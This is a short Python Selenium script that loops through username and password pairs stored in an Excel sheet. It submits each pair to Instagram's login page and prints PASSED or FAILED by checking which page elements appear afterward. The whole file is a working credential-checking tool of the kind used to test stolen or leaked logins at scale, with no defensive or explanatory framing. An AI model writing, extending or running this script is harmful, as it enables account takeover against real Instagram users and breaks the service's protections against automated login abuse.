from selenium import webdriver
from selenium.webdriver.common.by import By
from openpyxl import load_workbook
import time

options = webdriver.ChromeOptions()
options.add_experimental_option('excludeSwitches',['enable-logging'])
driver = webdriver.Chrome(options=options)
wb = load_workbook("C:\excelll\dataaa.xlsx")
sheetRange = wb['Sheet1']

driver.get("https://www.instagram.com/")
driver.implicitly_wait(10)

i = 1

while i <= len(sheetRange['A']):
    Username = sheetRange['A'+str(i)].value
    Password = sheetRange['B'+str(i)].value

    driver.execute_script("window.history.go(-0)")
    
    try:
        driver.find_element(by=By.NAME, value="username").send_keys(Username)
        driver.find_element(by=By.NAME, value="password").send_keys(Password)
        driver.find_element(by=By.XPATH, value="//div[text()='Log in']").click() 
        time.sleep(1)

        pass
        driver.find_element(By.XPATH, value="//div[text()='resend it']")
        print("\33[92m",i,"PASSED")
        i = i + 1 

    except:
        driver.find_element(By.XPATH, value="//p[text()='Sorry, your password was incorrect. Please double-check your password.']")
        print("\33[31m",i,"FAILED")
        i = i + 1